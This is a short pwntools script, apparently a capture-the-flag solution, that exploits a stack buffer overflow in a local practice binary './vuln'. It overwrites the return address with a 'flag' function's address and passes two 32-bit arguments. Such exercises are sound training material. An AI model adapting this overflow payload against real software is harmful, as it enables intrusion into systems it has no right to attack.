#!/bin/python3

from pwn import *


p = process('./vuln')

elf = ELF('./vuln')


offsetToRet = 0xcc - 0x10
offsetToParam = 4

payload = b"A"*offsetToRet
payload += p32(elf.sym['flag'])
payload += b"B"*offsetToParam # note that putting params on the stack only works for 32-bit. Use ROP for 64-bit
payload += p32(0xDEADBEEF)
payload += p32(0xC0DED00D)



p.sendline(payload)

p.interactive()

